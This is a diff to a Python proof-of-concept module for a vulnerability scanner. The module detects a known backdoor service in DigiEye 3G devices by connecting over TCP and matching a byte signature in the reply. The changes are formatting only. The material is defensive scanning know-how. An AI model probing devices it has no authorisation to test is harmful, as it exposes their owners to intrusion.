@@ -5,11 +5,12 @@ from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import socket
 import urlparse
 
+
 class Vuln(ABVuln):
-    vuln_id = 'DigiEye_0001' # 平台漏洞编号，留空
+    vuln_id = 'DigiEye_0001'  # 平台漏洞编号，留空
     name = 'DigiEye 3G(software version 3.19.30004) Backdoor'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.OTHER # 漏洞类型
+    type = VulnType.OTHER  # 漏洞类型
     disclosure_date = '2014-07-07'  # 漏洞公布时间
     desc = '''
         Affected devices include a backdoor service listening on TCP
@@ -26,6 +27,7 @@ class Vuln(ABVuln):
     product = 'DigiEye 3G'  # 漏洞应用名称
     product_version = 'software version 3.19.30004'  # 漏洞应用版本
 
+
 class Poc(ABPoc):
     poc_id = '41287aa9-4257-44d4-bbc7-91c629ab642c'
     author = '47bwy'  # POC编写者
@@ -38,7 +40,7 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             o = urlparse.urlparse(self.target)
             target = o.hostname
@@ -49,14 +51,15 @@ class Poc(ABPoc):
             resp = sock.recv(12)
             sock.close()
             if resp[-4:] == '\x00\x0A\xAE\x60':
-                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                        target=self.target, name=self.vuln.name))
+                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
+                    target=self.target, name=self.vuln.name))
 
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
